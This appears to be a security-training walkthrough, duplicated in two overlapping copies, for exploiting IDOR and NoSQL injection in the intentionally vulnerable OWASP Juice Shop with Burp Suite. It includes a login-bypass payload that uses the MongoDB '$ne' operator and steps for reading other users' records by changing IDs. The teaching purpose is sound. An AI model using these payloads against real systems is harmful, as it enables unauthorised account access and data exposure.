## Setup OWASP Juice Shop
- Install Node.js and npm if you haven't.
- Clone or download OWASP Juice Shop.
- Start the app:
  ```
  npm start
  ```
- Juice Shop will run on http://localhost:3000 by default.[1]

## IDOR (Broken Object Level Authorization) Testing Steps
1. In a browser or API client, send a GET request:
   ```
   GET http://localhost:3000/api/users/1
   ```
2. Capture this request in Burp Suite Proxy with intercept on.
3. Send the request to Burp Repeater.
4. Modify the URL to:
   ```
   GET /api/users/2
   ```
5. Send the modified request and observe the response.
6. If user 2’s information is returned despite authentication or authorization checks, IDOR vulnerability is confirmed.[2][3][4]

## NoSQL Injection Testing Steps
1. Capture a login request in Burp Suite Proxy, for example:
   ```
   POST http://localhost:3000/api/login
   Content-Type: application/json
   
   {
     "email": "admin",
     "password": "123"
   }
   ```
2. Send the request to Repeater.
3. Modify the JSON body to:
   ```json
   {
     "email": {"$ne": null},
     "password": {"$ne": null}
   }
   ```
4. Send the request.
5. If the login is successful despite incorrect password values, NoSQL injection is confirmed (because the query bypasses normal authentication logic).[3][5][6]

***

### Summary

| Vulnerability            | Action in Burp Suite                                  | Success Indicator                                      |
|-------------------------|------------------------------------------------------|------------------------------------------------------|
| IDOR                    | Change user ID in GET /api/users/{id} and resend     | Accessing another user's data without permissions    |
| NoSQL Injection         | Modify POST login JSON to inject MongoDB operators   | Login succeeds bypassing authentication               |

This exercise demonstrates broken access control and injection flaws in REST APIs using OWASP Juice Shop and Burp Suite.

If needed, detailed commands for installing OWASP Juice Shop or configuring Burp Suite proxy can be provided.Here are detailed steps for Lab 3 exploiting REST API vulnerabilities (IDOR + NoSQL Injection) using OWASP Juice Shop and Burp Suite:

## 1. Setup OWASP Juice Shop
- Install Node.js and npm if needed.
- Download or clone OWASP Juice Shop.
- Run:
  ```
  npm start
  ```
- Access Juice Shop at `http://localhost:3000`.

## 2. Testing IDOR (Insecure Direct Object Reference)
- In your browser, access the API endpoint:
  ```
  GET http://localhost:3000/api/users/1
  ```
- In Burp Suite, intercept this request via Proxy.
- Right-click the intercepted request → Send to Repeater.
- In Repeater, modify the path to:
  ```
  GET /api/users/2
  ```
- Send the request.
- If the response contains user 2’s data without proper authorization, IDOR is confirmed.

## 3. Testing NoSQL Injection
- Capture a login API POST request with JSON body like:
  ```json
  { "email": "admin", "password": "123" }
  ```
- Send this to Repeater in Burp Suite.
- Modify the JSON body to:
  ```json
  { "email": { "$ne": null }, "password": { "$ne": null } }
  ```
- Send the modified request.
- If you successfully bypass login, NoSQL injection is confirmed.

***

### Explanation
- IDOR happens due to missing authorization checks on object access.
- NoSQL injection exploits the MongoDB query evaluation to bypass login with special JSON operators like `$ne` (not equal).
- OWASP Juice Shop includes these as challenges to teach these vulnerabilities practically.

